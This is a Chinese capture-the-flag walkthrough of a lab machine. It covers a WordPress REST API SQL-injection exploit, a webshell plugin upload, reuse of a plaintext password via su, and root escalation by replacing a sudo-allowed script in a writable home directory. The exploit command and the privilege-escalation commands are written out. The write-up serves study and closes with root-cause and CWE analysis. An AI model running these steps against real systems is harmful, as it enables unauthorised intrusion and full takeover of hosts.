# 靶机 Bomb — 渗透测试全过程记录

**目标 IP：** `192.168.101.101`
**难度：** 中等
**标签：** CVE-2026-63030、WordPress SQLi、密码复用、Sudo 滥用、目录权限绕过

---

## 概述

本文记录了对目标靶机 `Bomb` 的完整渗透过程。攻击链如下：

1. 通过端口扫描发现目标开放 SSH（22）和 HTTP（80）服务，Web 端运行 WordPress 7.1-beta1。
2. 利用 **CVE-2026-63030**（WordPress REST API 路由混淆 SQL 注入），创建管理员账户后通过插件上传获取 WebShell，以 `apache` 用户身份建立初始立足点。
3. 在系统文件中发现硬编码的凭据，利用密码复用横向移动到 `ll104567` 用户，获取 `user.txt`。
4. 利用 sudo 配置中可执行脚本所在目录的写权限，通过替换脚本实现提权至 root，获取 `root.txt`。

## 二、漏洞利用（Exploitation）

### 2.1 CVE-2026-63030 — WordPress REST API SQL 注入

#### 2.1.1 漏洞简介

CVE-2026-63030 是 WordPress 7.1-beta1 中一个高危 SQL 注入漏洞，位于 REST API 的路由解析模块。攻击者可通过精心构造的 REST API 请求，利用路由混淆注入恶意 SQL 语句，实现管理员账户创建、数据窃取等操作。

#### 2.1.2 载荷构造与执行

使用公开 exp 对该漏洞进行利用，创建管理员账户后通过 WordPress 内置的插件上传功能写入 WebShell：

```bash
python3 exp.py --url http://192.168.101.101:80/
```

**利用链路：**

```
REST API 路由混淆 SQLi
        │
        ▼
注入创建管理员账户（wp-admin）
        │
        ▼
登录后台 → 上传恶意插件（PHP WebShell）
        │
        ▼
触发插件 → 获得 apache 用户 Shell
```

#### 2.1.3 结果

成功以 `apache` 用户身份执行命令：

```
uid=104(apache) gid=106(apache)
```

#### 2.1.4 漏洞根因分析

| 要素 | 说明 |
|------|------|
| **触发点** | WordPress REST API 路由解析器 |
| **漏洞类型** | SQL 注入（路由混淆导致参数拼接未做预编译处理） |
| **缺失防护** | 未对路由参数进行严格的类型校验与参数化查询 |
| **影响** | 攻击者可注入任意 SQL 语句，绕过认证创建管理员账户 |
| **利用条件** | 目标 WordPress 版本为 7.1-beta1，REST API 对外开放 |

## 三、初始访问（Initial Access）

以 `apache` 用户身份在目标系统上立足后，首先进行本地信息收集。

### 3.1 凭据发现

在 `/usr/bin/` 目录下发现非标准文件 `12138.txt`：

```bash
cat /usr/bin/12138.txt
```

```
Fxa6DZEOnghp20V5aXRP
```

**文件权限分析：**

```bash
ls -l /usr/bin/12138.txt
# -rw-r----- 1 ll104567 apache [...] /usr/bin/12138.txt
```

文件属于 `ll104567:apache`，且 `apache` 组具有读取权限——当前用户 `apache` 恰好可以直接读取。

### 3.2 横向移动 — apache → ll104567

观察到 `/bin/su` 是指向 `/bin/bbsuid` 的符号链接（SUID 二进制），可借助该工具进行用户切换。尝试将 `12138.txt` 中的密码复用于 `ll104567`：

```bash
echo "Fxa6DZEOnghp20V5aXRP" | /bin/su ll104567 -c "id"
# uid=1000(ll104567)
```

密码复用成功。此时已从 Web 服务用户横向移动至具有真实家目录和登录 Shell 的系统用户 `ll104567`。

### 3.3 用户级 Flag

```bash
ll104567@bomb:~$ cat user.txt
flag{user-bea7e45c177a6909a5a5c6138616b7e3}
```

## 四、权限提升（Privilege Escalation）

### 4.1 信息枚举 — Sudo 权限

```bash
ll104567@bomb:~$ sudo -l
User ll104567 may run the following commands on bomb:
    (ALL) NOPASSWD: /home/ll104567/12138.sh
```

用户 `ll104567` 可以 root 身份免密执行 `/home/ll104567/12138.sh`。

### 4.2 目标脚本分析

```bash
ll104567@bomb:~$ ls -l /home/ll104567/12138.sh
-r-xr-xr-x 1 root root [...] /home/ll104567/12138.sh
```

**权限分析：**

| 对象 | 所有者 | 权限 | 可修改？ |
|------|--------|------|----------|
| `/home/ll104567/12138.sh` | root:root | 555 (`r-xr-xr-x`) | ❌ 不可修改 |
| `/home/ll104567/` (父目录) | ll104567 | rwx | ✅ 可写入 |

### 4.3 提权路径评估

脚本文件本身不可修改，但其所在目录属于当前用户。在确定最终利用方式之前，对可能的绕过方案逐一评估：

#### 方法一：直接修改脚本文件 ❌

```
问题：
- 文件权限为 555 (r-xr-xr-x)，所属 root:root
- 对文件没有写权限，echo/vi/sed 均无法修改

结论：不可行
```

#### 方法二：利用脚本内部逻辑注入 ❌

```
问题：
- 脚本的具体内容未知，无法确定是否存在命令注入点
- 即使脚本存在参数输入，也无法保证以 root 执行时能注入恶意命令

结论：缺乏信息，无法可靠利用
```

#### 方法三：目录写权限 → 替换文件 ✅

```
关键洞察：
- 删除文件需要的是目录的写权限，而非文件本身的写权限
- /home/ll104567 属于 ll104567，拥有完全写权限
- 可以 mv（重命名）原脚本，在同目录下新建同名恶意脚本
- sudo 执行时不会校验文件是否被替换，仅按路径执行

结论：可行
```

### 4.4 最终利用方案：目录写权限绕过

#### 设计思路

利用 Linux 文件系统中 **"删除文件由目录权限控制"** 这一机制：虽然 `12138.sh` 属于 root 且不可修改，但其父目录 `/home/ll104567` 拥有写权限，因此可以将其移走并创建同名脚本。由于 sudoers 配置文件仅校验路径，不会校验文件完整性，替换后的脚本将被以 root 权限执行。

#### 利用过程

```bash
cd /home/ll104567

# 第一步：移走原脚本（利用目录写权限）
mv 12138.sh 12138.sh.bak

# 第二步：创建同名恶意脚本
echo -e '#!/bin/bash\n/bin/bash' > 12138.sh
chmod +x 12138.sh

# 第三步：以 root 身份执行替换后的脚本
sudo /home/ll104567/12138.sh
```

#### 执行结果

```
uid=0(root)
```

成功提升至 root 权限。

```bash
root@bomb:~# cat /root/root.txt
flag{root-8c7a3f1b9d4e2f6a0c5b8d3e1f7a4c9b}
```

## 五、总结

### 攻击链回顾

```
端口扫描 → WordPress 识别 → CVE-2026-63030 SQLi → 插件上传 RCE
    → apache Shell → /usr/bin/12138.txt 密码泄露 → su 横向移动
    → ll104567 → sudo 枚举 → 目录写权限绕过 → 脚本替换 → Root
```

### 漏洞盘点

| 序号 | 漏洞类型 | 位置 | CWE | 严重性 |
|------|----------|------|-----|--------|
| 1 | SQL 注入（路由混淆） | WordPress REST API | CWE-89 | 🔴 高危 |
| 2 | 敏感信息明文存储 | `/usr/bin/12138.txt` | CWE-256 | 🔴 高危 |
| 3 | 密码复用（Web→系统用户） | 用户 ll104567 | CWE-521 | 🟠 中危 |
| 4 | 目录权限配置不当 | `/home/ll104567` (属主可写) | CWE-276 | 🟠 中危 |
| 5 | Sudo 权限配置过宽 | `/etc/sudoers` — 无哈希校验 | CWE-269 | 🔴 高危 |

### 关键知识点

| 技巧 | 说明 |
|------|------|
| CVE-2026-63030 | WordPress REST API 路由混淆 SQLi → 管理员创建 → 插件上传 RCE |
| 密码复用 | Web 应用密码与系统用户密码相同时，横向移动成本极低 |
| 目录 vs 文件权限 | 删除/替换文件需要的是**目录**的写权限，而非文件本身的写权限 |
| sudo + 可替换脚本 | sudoers 允许路径下的脚本若可被当前用户替换，直接执行恶意逻辑即可提权 |
